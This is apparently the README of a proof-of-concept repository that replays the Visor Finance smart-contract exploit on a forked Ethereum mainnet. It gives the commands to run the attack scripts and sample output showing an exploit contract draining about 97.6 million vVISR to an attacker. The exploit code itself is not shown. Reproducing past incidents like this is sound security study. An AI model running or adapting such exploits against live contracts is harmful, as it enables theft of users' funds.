# Visor exploit

## How to run

Install nodejs/yarn first

Set up the `forking url` (in `hardhat.config.js`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/eth/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
yarn install
hardhat run scripts/attack.js
```
You will see similar output later
```
Exploit contract deployed to: 0x720472c8ce72c2A2D711333e064ABD3E6BbEAdd3
Exploiting... transcation: 0xacbb306938a1746da161700ea9a76ffd0f0a5c749dd543f8572aef34b2b94ab7
exploit complete
Attacker vVISR balance:97624975.48181573
```
This means the attack is complete
> The block height of the fork is 13849006

If you want to test another vulnerability, run
```bash
hardhat run scripts/attack2.js
```
## link

* https://twitter.com/VisorFinance/status/1473306777131405314
